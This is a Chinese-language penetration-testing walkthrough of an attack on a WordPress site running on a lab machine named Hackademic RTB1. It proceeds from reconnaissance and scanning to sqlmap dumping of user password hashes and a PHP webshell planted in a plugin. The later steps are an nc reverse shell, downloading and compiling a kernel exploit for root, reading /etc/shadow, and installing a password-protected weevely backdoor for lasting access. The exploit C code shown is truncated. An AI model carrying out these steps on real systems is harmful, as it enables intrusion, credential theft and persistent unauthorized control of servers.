网络安全

1. 渗透测试前的简单信息收集
2. sqlmap的使用
3. nmap的使用
4. nc反弹提权
5. Linux系统的权限提升
6. backtrack 5中渗透测试工具nikto和w3af的使用等。

假设黑客要入侵的网站域名为：hack-test.com <br />用ping命令获取网站服务器的IP地址<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/396745/1653314929189-9afc1480-978a-4593-ab3e-cabdd2b3c748.png#averageHue=%23282828&clientId=u5f714828-8404-4&from=paste&height=490&id=ue2bc24ae&originHeight=1224&originWidth=2165&originalType=binary&ratio=1&rotation=0&showTitle=false&size=169581&status=done&style=none&taskId=u895864fb-eca6-4d56-b8a1-6f09a6ba3bc&title=&width=866)<br />现在获取了网站服务器的IP地址为：173.236.164.23<br />寻找同一服务器上的其它网站，使用[sameip.org](https://sameip.org)。<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910310944-0046fe88-e0bd-4207-8b56-d881f40a73de.webp#averageHue=%23e5ebf0&height=276&id=u3a1a0e18&originHeight=276&originWidth=521&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=shadow&title=&width=521)<br />26 sites hosted on IP Address 173.236.138.113

| ID | Domain | Site Link |
| --- | --- | --- |
| 1 | hijackthisforum.com | hijackthisforum.com |
| 2 | sportforum.net | sportforum.net |
| 3 | freeonlinesudoku.net | freeonlinesudoku.net |
| 4 | cosplayhell.com | cosplayhell.com |
| 5 | videogamenews.org | videogamenews.org |
| 6 | gametour.com | gametour.com |
| 7 | qualitypetsitting.net | qualitypetsitting.net |
| 8 | brendanichols.com | brendanichols.com |
| 9 | 8ez.com | 8ez.com |
| 10 | hack-test.com | hack-test.com |
| 11 | kisax.com | kisax.com |
| 12 | paisans.com | paisans.com |
| 13 | mghz.com | mghz.com |
| 14 | debateful.com | debateful.com |
| 15 | jazzygoodtimes.com | jazzygoodtimes.com |
| 16 | fruny.com | fruny.com |
| 17 | vbum.com | vbum.com |
| 18 | wuckie.com | wuckie.com |
| 19 | force5inc.com | force5inc.com |
| 20 | virushero.com | virushero.com |
| 21 | twincitiesbusinesspeernetwork.com | twincitiesbusinesspeernetwork.com |
| 22 | jennieko.com | jennieko.com |
| 23 | davereedy.com | davereedy.com |
| 24 | joygarrido.com | joygarrido.com |
| 25 | prismapp.com | prismapp.com |
| 26 | utiligolf.com | utiligolf.com |

173.236.138.113上有26个网站，很多黑客为了攻破网站可能会检查同服务器上的其它网站，但是本次是以研究为目标，将抛开服务器上的其它网站，只针对网站来进行入侵检测。<br />需要关于网站的以下信息：

1.  DNS records (A, NS, TXT, MX and SOA)
2.  Web Server Type (Apache, IIS, Tomcat)
3.  Registrar (the company that owns your domain)
4.  Your name, address, email and phone
5.  Scripts that your site uses (php, asp, asp.net, jsp, cfm)
6.  Your server OS (Unix,Linux,Windows,Solaris)
7.  Your server open ports to internet (80, 443, 21, etc.)

开始找网站的DNS记录，用[who.is](https://who.is/)来完成这一目标.<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/396745/1653316296003-eb8ea28d-489e-41fd-9f2c-8eeba38bb152.png#averageHue=%23d4b68b&clientId=u59e923a6-475e-4&from=paste&height=510&id=ua3d3d6c9&originHeight=1274&originWidth=2994&originalType=binary&ratio=1&rotation=0&showTitle=false&size=182672&status=done&style=none&taskId=ueafacc64-8ec1-48ae-b1c9-bf8d5a3f218&title=&width=1197.6)<br />可以发现DNS记录如下<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/396745/1653316158431-cf0b7b84-6825-4fb2-a738-27c6ae29dc83.png#averageHue=%23d4b589&clientId=u59e923a6-475e-4&from=paste&height=505&id=u030c5fd6&originHeight=1262&originWidth=2967&originalType=binary&ratio=1&rotation=0&showTitle=false&size=168367&status=done&style=none&taskId=ubeb68b07-a612-42f2-af62-5120d5e34fb&title=&width=1186.8)<br />来确定web服务器的类型<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/396745/1653316207291-c03ea954-0f7a-4d37-ba80-a316bdfb5bf1.png#averageHue=%23e0cca6&clientId=u59e923a6-475e-4&from=paste&height=629&id=u871d6d13&originHeight=1572&originWidth=2973&originalType=binary&ratio=1&rotation=0&showTitle=false&size=283323&status=done&style=none&taskId=u56a0c94d-7564-4d8f-a8d0-840aaad03e2&title=&width=1189.2)<br />可以发现Web服务器是apache，接下来确定它的版本。<br />IP: 173.236.138.113<br />Website Status: active<br />Server Type: Apache<br />Alexa Trend/Rank:  1 Month:3,213,968 3 Month: 2,161,753<br />Page Views per Visit:  1 Month: 2.0 3Month: 3.7<br />接下来是时候寻找网站域名的注册信息，电话、邮箱、地址等.<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/396745/1653316375114-7a7b4151-07f5-4e7d-853e-85763ea7805f.png#averageHue=%23eeeeed&clientId=u59e923a6-475e-4&from=paste&height=713&id=u9eabe784&originHeight=1783&originWidth=3840&originalType=binary&ratio=1&rotation=0&showTitle=false&size=304477&status=done&style=none&taskId=ufd1f0dad-e233-4589-bea6-5523acf3c68&title=&width=1536)<br />现在已经获取了网站域名的注册信息，包括网站开发者的重要信息等。<br />可以通过backtrack5中的whatweb来获取网站服务器操作系统类型和服务器的版本。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/396745/1653315383655-188dcbe9-57c1-44cb-9506-52a3e6f04db2.png#averageHue=%23141414&clientId=u5f714828-8404-4&from=paste&height=222&id=ue8a22b15&originHeight=555&originWidth=3323&originalType=binary&ratio=1&rotation=0&showTitle=false&size=122017&status=done&style=none&taskId=u8262c351-5eb4-4e67-bbd3-d4d3792dd05&title=&width=1329.2)<br />可以发现网站使用了Apache，Web服务器版本Apache 2.2.15。继续查看网站服务器开放的端口，用渗透测试工具nmap：<br />1-Find services that run on server(查看服务器上运行的服务)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/396745/1653315550499-986c5d34-1478-40e2-bf7e-c4d3c7d700fa.png#averageHue=%23161616&clientId=u5f714828-8404-4&from=paste&height=540&id=u4df9a022&originHeight=1351&originWidth=3074&originalType=binary&ratio=1&rotation=0&showTitle=false&size=216189&status=done&style=none&taskId=u9d6d4adb-82df-4fe0-8d22-d46a5a7120c&title=&width=1229.6)<br />2-Find server OS(查看操作系统版本)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/396745/1653315613374-eb86ef12-227a-4116-affa-9c8233b1e57b.png#averageHue=%23101010&clientId=u5f714828-8404-4&from=paste&height=170&id=uf5f67655&originHeight=425&originWidth=2272&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38504&status=done&style=none&taskId=u8695b01e-c6a0-477b-a0a0-451ff26890a&title=&width=908.8)<br />可以看到只有以root用户才能知道操作系统的信息，现在已经收集了所有关于网站的重要信息，接下来开始扫描寻找漏洞，比如:<br />Sql injection – Blind sql injection – LFI – RFI – XSS – CSRF等等。<br />使用Nikto来收集漏洞信息:
```bash
root@bt:/pentest/web/nikto# perl nikto.pl -h hack-test.com
```
![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910312154-99733bb0-5e5e-41fa-9368-a572adb0c95f.webp#averageHue=%23323b44&height=198&id=ud26842e4&originHeight=198&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />也会用到Backtrack 5 R1中的W3AF 工具:
```bash
root@bt:/pentest/web/w3af# ./w3af_gui
```
![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910312348-2b3eafe3-550c-4184-8841-512ec1a13395.webp#averageHue=%23121918&height=135&id=uc3b66ae3&originHeight=135&originWidth=490&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=490)<br />输入要检测的网站地址，选择完整的安全审计选项。<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910312424-c2483e2b-f4c7-484f-a166-42532bb68da9.webp#averageHue=%23b0b0ab&height=413&id=u9e6d21b6&originHeight=413&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />稍等一会，将会看到扫描结果。<br />![](https://cdn.nlark.com/yuque/0/2021/jpeg/396745/1622910312406-4b1d014c-077e-4c9d-9c84-cb4077711f14.jpeg#averageHue=%23ddd9d2&height=417&id=u706ab667&originHeight=417&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />发现网站存在sql注入漏洞、XSS漏洞、以及其它的漏洞。来探讨SQL注入漏洞。<br />http://hack-test.com/Hackademic_RTB1/?cat=d％27z％220<br />通过工具发现这个URL存在SQL注入，通过Sqlmap来检测这个url。<br />Using sqlmap with –u url<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/396745/1677049762253-354f39ed-e0bc-4a9f-83ff-1a61fa2ac56c.png#averageHue=%23383838&clientId=u24893866-15a3-4&from=paste&height=704&id=u48c4be62&originHeight=1760&originWidth=3323&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1436714&status=done&style=none&taskId=u93c23085-9e9f-436f-bad7-66579b2357e&title=&width=1329.2)<br />过一会可以看到<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/396745/1677049722664-38d4e755-bd49-4d0e-ba7f-a60d53058972.png#averageHue=%233b3b3b&clientId=u24893866-15a3-4&from=paste&height=704&id=u372372a9&originHeight=1760&originWidth=3323&originalType=binary&ratio=2.5&rotation=0&showTitle=false&size=1509301&status=done&style=none&taskId=u43c339b1-ebe0-4e01-8cfd-239a866d827&title=&width=1329.2)<br />输入N按回车键继续<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910312811-33c9d1fd-e0cb-44ec-8ca0-5fa9270ca53a.webp#averageHue=%23333734&height=66&id=u9c9b3c4b&originHeight=66&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />可以发现网站MySQL存在显错注入，MySQL数据库版本是5.0。通过加入参数“`-dbs`”来尝试采集数据库.<br />![](https://cdn.nlark.com/yuque/0/2021/png/396745/1622910313102-0d8c689f-d447-4f8b-910d-0f4e79e294c1.png#averageHue=%23614535&height=17&id=u5094c38f&originHeight=17&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910313221-49f20bc0-f8d3-4b19-b30f-046b6acf97f4.webp#averageHue=%23a5a7a7&height=71&id=uec46c909&originHeight=71&originWidth=293&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=293)<br />发现三个数据库，接下来通过参数“`-D wordpress -tables`”来查看`wordpress`数据库的所有表名<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910313377-a2d667b4-087e-4ed3-af7b-5a4a5dc6ac0b.webp#averageHue=%23646869&height=21&id=uf04a7a87&originHeight=21&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910313443-d6c0ee63-f3fa-4728-a39d-7ce03f5ecbda.webp#averageHue=%232c3230&height=217&id=u9caad1c4&originHeight=217&originWidth=196&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=196)<br />通过参数“`-T wp_users –columns`”来查看`wp_users`表中的字段。<br />![](https://cdn.nlark.com/yuque/0/2021/png/396745/1622910313830-802ca23c-e44d-46c5-878a-99bfe22fd388.png#averageHue=%23674a38&height=22&id=ue77e50d8&originHeight=22&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />![](https://cdn.nlark.com/yuque/0/2021/jpeg/396745/1622910313745-da1a82ba-0895-48b3-82d8-83c31119378c.jpeg#averageHue=%23343632&height=460&id=u2d3b44f1&originHeight=460&originWidth=363&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=363)<br />接下来猜解字段`user_login`和`user_pass`的值。用参数`-C user_login,user_pass–dump`<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910313821-ed1c37fa-916e-405f-88a2-5787d3a9a2a3.webp#averageHue=%23171d1a&height=224&id=u554ea5ab&originHeight=224&originWidth=428&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=428)<br />可以发现用户名和密码hashes值。需要通过以下在线破解网站来破解密码hashes<br />[http://www.onlinehashcrack.com/free-hash-reverse.php](http://www.onlinehashcrack.com/free-hash-reverse.php)<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910313969-0a621033-93dd-499c-8b2c-1c931795f40b.webp#averageHue=%23b8ca59&height=119&id=ue14f7c5a&originHeight=119&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />登陆wordpress的后台wp-admin<br />尝试上传php webshell到服务器，以方便运行一些Linux命令。在插件页面寻找任何可以编辑的插件。选择Textile这款插件，编辑插入`php webshell`，点击更新文件，然后访问phpwebshell。<br />![](https://cdn.nlark.com/yuque/0/2021/jpeg/396745/1622910314030-b97f02b5-2329-454d-bcd4-2db1a44866fd.jpeg#averageHue=%23eae9e6&height=236&id=uca8fba6a&originHeight=236&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910314553-c9d5f993-ae8a-419b-a6a4-04a33f1d1cfa.webp#averageHue=%23ecf0ef&height=268&id=u68ab884e&originHeight=268&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />Phpwebshell被解析了，可以控制网站的文件，但是只希望获得网站服务器的root权限，来入侵服务器上其它的网站。<br />用NC来反弹一个shell，首先在电脑上监听5555端口。<br />![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910314626-e921152a-f52c-4dde-907f-2c54fd119494.webp#averageHue=%233e433f&height=37&id=ub83fded7&originHeight=37&originWidth=376&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=376)<br />然后在Php webshell上反向连接电脑，输入你的IP和端口5555。<br />![](https://cdn.nlark.com/yuque/0/2021/jpeg/396745/1622910314536-19dc73b2-1c69-439c-849f-143b60e9d6cc.jpeg#averageHue=%23e8e6e5&height=293&id=u7301306a&originHeight=293&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />点击连接可以看到<br />![](https://cdn.nlark.com/yuque/0/2021/png/396745/1622910314459-ba1f6130-8fbe-4ac2-b475-7160aed39387.png#averageHue=%23a07b5c&height=51&id=u9aac303e&originHeight=51&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />接下来尝试执行一些命令：
```bash
id
uid=48(apache) gid=489(apache) groups=489(apache) （用来显示用户的id和组）
pwd
/var/www/html/Hackademic_RTB1/wp-content/plugins （显示服务器上当前的路径）
uname -a
Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 721:41:45 EST 2009 i686 i686 i386 GNU/Linux
```
（显示内核版本信息）<br />![](https://cdn.nlark.com/yuque/0/2021/jpeg/396745/1622910314707-85e179a1-7d48-4531-8017-a99a92cc5001.jpeg#averageHue=%235a5b56&height=153&id=u17b8ad06&originHeight=153&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />现在知道，服务器的内核版本是2.6.31.5-127.fc12.1686，在[exploit-db.com](exploit-db.com)中搜索此版本的相关漏洞。<br />在服务器上测试了很多exp之后，用以下的exp来提升权限。<br />[http://www.exploit-db.com/exploits/15285](http://www.exploit-db.com/exploits/15285)<br />在nc shell上执行以下命令:
```bash
wget http://www.exploit-db.com/exploits/15285 -o roro.c
```
(下载exp到服务器并重命名为roro.c)<br />注：很多linux内核的exp都是C语言开发的，因此保存为.c扩展名。<br />exp roro.c代码如下：
```c
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#include
#define RECVPORT 5555
#define SENDPORT 6666
int prep_sock(int port)
{
int s, ret;
struct sockaddr_in addr;
s = socket(PF_RDS, SOCK_SEQPACKET, 0);
if(s < 0)
{
printf(“[*] Could not open socket.”);
exit(-1);
}
memset(&addr, 0, sizeof(addr));
```
通过以上代码可以发现该exp是C语言开发的，需要将它编译成elf格式的，命令如下:
```bash
gcc roro.c –ororo
```
接下来执行编译好的exp
```bash
./roro
```
![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910315177-0cc5236c-83d8-4cae-b278-c7307e3e1dd9.webp#averageHue=%231c382d&height=263&id=udd5ea4ee&originHeight=263&originWidth=574&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=574)<br />执行完成之后输入id命令
```bash
id
# 可以发现已经是root权限了
uid=0(root) gid=0(root)
```
![](https://cdn.nlark.com/yuque/0/2021/png/396745/1622910315048-efabd940-73c4-49eb-a95b-f5f720d98137.png#averageHue=%23361d15&height=44&id=ubefc626a&originHeight=44&originWidth=364&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=364)<br />现在可以查看/etc/shadow文件
```bash
cat /etc/shadow
```
![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910315311-a93227ed-f872-4c99-a522-9f1719aec1b6.webp#averageHue=%23173329&height=481&id=u5dd6d245&originHeight=481&originWidth=568&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=568)<br />可以使用”john theripper”工具破解所有用户的密码。但是不会这样做，需要在这个服务器上留下后门以方便在任何时候访问它。<br />用weevely制作一个php小马上传到服务器上。

1. weevely使用选项
```bash
root@bt:/pentest/backdoors/web/weevely#./main.py -
```
![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910315335-27a9887a-56bc-40f5-a9f1-16596da941fe.webp#averageHue=%2319352c&height=325&id=u042bd253&originHeight=325&originWidth=568&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=568)

2. 用weevely创建一个密码为koko的php后门
```bash
root@bt:/pentest/backdoors/web/weevely#./main.py -g -o hax.php -p koko
```
![](https://cdn.nlark.com/yuque/0/2021/webp/396745/1622910315304-9163ef9a-3c25-4f85-ab67-1d970e77c760.webp#averageHue=%23384151&height=76&id=u24260e78&originHeight=76&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />接下来上传到服务器之后来使用它
```bash
root@bt:/pentest/backdoors/web/weevely#./main.py -t -uhttp://hack-test.com/Hackademic_RTB1/wp-content/plugins/hax.php -pkoko
```
![](https://cdn.nlark.com/yuque/0/2021/jpeg/396745/1622910315608-78b2e4a0-159c-414e-b750-8477e4dca339.jpeg#averageHue=%23000200&height=108&id=ufe21e7ae&originHeight=108&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)<br />测试hax.php后门<br />![](https://cdn.nlark.com/yuque/0/2021/jpeg/396745/1622910315834-fb2e6a60-e51d-4d36-88e5-5ec84ea05a12.jpeg#averageHue=%23281717&height=105&id=u2cce22c8&originHeight=105&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=576)
